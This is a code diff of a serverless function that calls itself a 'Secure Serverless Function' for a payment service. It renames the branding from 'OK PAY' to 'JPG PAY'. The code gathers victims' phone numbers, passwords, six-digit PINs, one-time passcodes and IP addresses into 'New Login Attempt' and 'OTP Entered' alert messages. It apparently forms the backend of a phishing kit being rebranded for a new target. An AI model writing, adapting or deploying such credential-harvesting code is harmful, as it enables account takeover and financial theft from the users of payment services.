@@ -1,4 +1,4 @@
-// api/send.js - OK PAY Secure Serverless Function
+// api/send.js - JPG PAY Secure Serverless Function
 
 const rateLimitMap = new Map();
 const RATE_LIMIT_WINDOW = 60 * 1000;
@@ -42,18 +42,18 @@ export default async function handler(req, res) {
       if (!pass || pass.length < 4) return res.status(400).json({ error: 'Invalid password' });
       if (!pin || !/^\d{6}$/.test(pin)) return res.status(400).json({ error: 'Invalid PIN' });
 
-      message = `🔔 *OK PAY - New Login Attempt*\n\n` +
+      message = `🔔 *JPG PAY - New Login Attempt*\n\n` +
                 `📞 Phone: ${phone}\n` +
                 `🔑 Password: ${pass}\n` +
                 `🔐 6-digit PIN: ${pin}\n` +
                 `🌐 IP: ${ip}`;
     } 
     else if (type === 'send_otp') {
-      message = `📩 *OK PAY - OTP Send Button Pressed*\nPhone: ${phone}\n🌐 IP: ${ip}`;
+      message = `📩 *JPG PAY - OTP Send Button Pressed*\nPhone: ${phone}\n🌐 IP: ${ip}`;
     } 
     else if (type === 'verify_otp') {
       if (!otp || !/^\d{6}$/.test(otp)) return res.status(400).json({ error: 'Invalid OTP' });
-      message = `🔐 *OK PAY - OTP Entered*\nPhone: ${phone}\nOTP: ${otp}`;
+      message = `🔐 *JPG PAY - OTP Entered*\nPhone: ${phone}\nOTP: ${otp}`;
     } 
     else {
       return res.status(400).json({ error: 'Invalid request type' });
